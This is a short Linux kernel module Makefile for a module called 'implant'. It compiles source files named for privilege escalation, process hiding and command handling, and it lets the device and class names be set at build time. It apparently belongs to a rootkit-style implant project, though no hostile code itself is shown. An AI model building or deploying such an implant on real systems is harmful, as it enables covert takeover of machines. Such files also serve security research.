MODNAME ?= implant

ccflags-y := -I$(src)/include

ifneq ($(IMPLANT_DEVICE_NAME),)
ccflags-y += -DIMPLANT_DEVICE_NAME=$(IMPLANT_DEVICE_NAME)
endif

ifneq ($(IMPLANT_CLASS_NAME),)
ccflags-y += -DIMPLANT_CLASS_NAME=$(IMPLANT_CLASS_NAME)
endif

obj-m := $(MODNAME).o

# add c files
SRCS += src/implant.c
SRCS += src/privilege_escalation.c
SRCS += src/hide_proc.c
SRCS += src/commands.c
SRCS += src/ketopt.c

OBJS := $(SRCS:.c=.o)

$(MODNAME)-y := $(OBJS)
